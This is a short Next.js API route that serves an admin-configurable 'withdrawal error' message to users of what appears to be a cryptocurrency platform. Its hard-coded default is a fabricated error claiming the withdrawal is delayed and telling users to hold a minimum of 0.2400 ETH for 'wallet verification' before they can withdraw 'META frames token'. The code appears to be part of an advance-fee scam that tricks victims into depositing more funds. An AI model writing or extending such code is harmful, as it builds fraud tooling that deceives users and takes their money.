import { NextResponse } from 'next/server';
import prisma from '@/lib/prisma';

const DEFAULT_MESSAGE = '#Error 456 - withdrawal processing delay... Insufficient amount for wallet verification. meet up the required minimum balance of 0.2400 ETH to withdraw all META frames token.';

export const dynamic = 'force-dynamic';

export async function GET() {
    try {
        const setting = await prisma.setting.findUnique({
            where: { key: 'withdraw_error_message' }
        });
        return NextResponse.json({
            message: setting?.value ?? DEFAULT_MESSAGE
        });
    } catch (error) {
        console.error('Get withdraw error message:', error);
        return NextResponse.json({ message: DEFAULT_MESSAGE });
    }
}
